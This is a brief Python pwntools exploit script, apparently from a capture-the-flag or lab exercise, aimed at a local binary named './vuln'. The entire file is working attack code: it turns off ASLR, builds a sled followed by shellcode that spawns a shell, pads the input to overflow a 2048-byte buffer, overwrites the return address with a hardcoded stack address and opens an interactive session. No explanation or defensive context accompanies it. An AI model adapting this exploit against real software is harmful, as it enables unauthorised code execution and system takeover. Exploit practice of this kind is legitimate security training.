#!/usr/bin/env python
from pwn import *


BIN = "./vuln"
context.binary = BIN
context.aslr = False
elf = ELF(BIN)


shellcode = asm("mov eax,eax") * 1000 + asm(shellcraft.sh())

io = process(BIN)
# gdb.attach(io, '''start''')

# First part: inject
payload = b""
payload += shellcode
payload += b"A" * (2048 + 8 - len(payload)) 
payload += p64(0x7fffffffe458 + 150)


io.send(payload)
io.interactive()
